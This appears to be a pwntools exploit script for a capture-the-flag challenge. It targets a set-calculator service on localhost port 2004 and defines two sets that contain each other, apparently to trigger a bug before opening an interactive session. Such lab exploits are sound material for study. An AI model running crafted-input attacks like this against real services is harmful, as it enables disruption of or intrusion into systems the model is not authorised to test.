"""
set1 = |"data", set2|	Create a set
set1 = set2+set3	union
set1 = set2^set3	intersection
set1 = set2-set3	difference
set1 = set2~set3	symmetric difference
set1 @@ set2		subset. Result is T or F
help		Help menu
exit		Exit
print		Prints all sets and their elements
prints <set1>	Print an expanded set
"""

from pwn import *

p = remote("0", 2004)
print p.recv()
payload = "aaa=||"
p.sendline(payload)

print p.recv()
payload = "bbb=||"
p.sendline(payload)

print p.recv()
payload = "aaa=|bbb|"
p.sendline(payload)

print p.recv()
payload = "bbb=|aaa|"
p.sendline(payload)
p.interactive()

